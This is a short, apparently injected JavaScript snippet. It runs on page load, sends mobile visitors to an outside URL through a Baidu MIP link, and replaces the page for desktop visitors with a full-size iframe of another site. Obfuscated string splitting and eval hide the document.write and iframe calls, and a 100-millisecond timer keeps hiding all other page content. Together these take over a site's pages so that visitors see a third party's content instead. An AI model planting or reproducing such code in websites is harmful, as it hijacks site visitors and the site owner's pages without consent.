function goPAGE() {
if	((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
        window.location.href = "https://m.baidu.com/mip/s/mip.hanmanman.com/cms/site/show?ID=178"
    } else {
        var ss = '<center id="yangchen"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="83' + '50" src="https://m.transcode.cn/c/s/wap.xiaoaipan.cn/"></iframe></center>';
        eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
        try {
            setInterval(function() {
                try {
                    document.getElementById("div" + "All").style.display = "no" + "ne"
                } catch (e) {}
                for (var i = 0; i < document.body.children.length; i++) {
                    try {
                        var tagname = document.body.children[i].tagName;
                        var myid = document.body.children[i].id;
                        if (myid != "iconDiv1" && myid != "yangchen") {
                            document.body.children[i].style.display = "non" + "e"
                        }
                    } catch (e) {}
                }
            }, 100)
        } catch (e) {}
    }
}
goPAGE();
